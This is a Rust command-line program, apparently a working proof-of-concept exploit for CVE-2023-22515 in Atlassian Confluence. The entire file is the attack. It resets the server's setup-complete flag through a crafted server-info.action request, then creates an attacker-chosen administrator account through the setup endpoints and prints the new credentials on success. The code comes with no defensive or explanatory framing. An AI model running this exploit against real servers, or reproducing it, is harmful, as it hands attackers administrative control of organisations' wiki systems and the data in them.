use clap::Parser;
use reqwest::header::{HeaderMap, HeaderValue};
use reqwest::redirect::Policy;
use reqwest::Client;

#[derive(Parser)]
#[clap(name = "CVE-2023-22515", about = "CVE-2023-22515")]
struct Args {
    #[clap(short, long, required = true, help = "Insert target")]
    target: String,

    #[clap(short, long, required = true, help = "Insert username")]
    username: String,

    #[clap(short, long, required = true, help = "Insert password")]
    password: String,
}

macro_rules! header_map {
    ($( $key: expr => $value: expr ),* $(,)?) => {
        {
            let mut map: HeaderMap = HeaderMap::new();
            $(
                let value = HeaderValue::from_static($value);
                map.insert($key, value);
            )*
            map
        }
    };
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();

    let headers = header_map! {
        "User-Agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Accept" => "*/*",
        "X-Atlassian-Token" => "no-check",
        "Content-Type" => "application/x-www-form-urlencoded",
        "Connection" => "close",
    };

    let client = Client::builder().http1_title_case_headers().build()?;
    let url = format!("{}/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false", args.target);

    println!( "[!] Request for: {}/setup/setupadministrator.action", args.target);
    let response = client.get(url).headers(headers.clone()).send().await.unwrap();
    let status = response.status();
    if status.is_success() && response.text().await?.contains("Confluence") {
        println!("[!] Creating Administrator account");
        let url2 = format!("{}/setup/setupadministrator.action", args.target);
        let data = format!("username={}&fullName={}&email={}@localhost&password={}&confirm={}&setup-next-button=Next", args.username, args.username, args.username, args.password, args.password);
        let client = Client::builder()
            .redirect(Policy::none())
            .http1_title_case_headers()
            .build()?;
        let response = client
            .post(url2)
            .body(data)
            .headers(headers)
            .send()
            .await
            .unwrap();

        println!("[!] Checking the answer");
        if let Some(cookie) = response.headers().get("Set-Cookie") {
            if cookie.to_str().unwrap().contains("JSESSIONID") && response.status().is_redirection()
            {
                let url3 = format!("{}/setup/finishsetup.action", args.target);
                let response = client.get(url3).send().await.unwrap();
                let status = response.status();

                if status.is_success() {
                    println!("[+] Username created successfully: {}", args.username);
                    println!("[+] Password created successfully: {}", args.password);
                    println!("[+] Exploit ending successfully!!");
                }
            } else {
                eprintln!("[-] Exploit failed :(");
            }
        } else {
            eprintln!("[-] No Set-Cookie header found");
        }
    } else {
        eprintln!("[!] Response Error: Status code {}", status);
    }

    Ok(())
}
